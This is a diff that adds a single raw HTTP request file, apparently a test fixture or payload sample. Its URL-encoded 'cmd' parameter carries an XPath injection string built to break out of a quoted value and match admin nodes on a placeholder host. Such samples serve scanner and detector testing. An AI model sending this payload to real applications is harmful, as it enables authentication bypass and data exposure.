@@ -1,0 +1,4 @@
+GET /a?cmd=x%27%2Bor%2B%2F%2Fadmin%5Bnot%28text%28%29%29%5D%2Bor%2B%27y HTTP/1.1
+Host: demo.example.com
+Connection: close
+
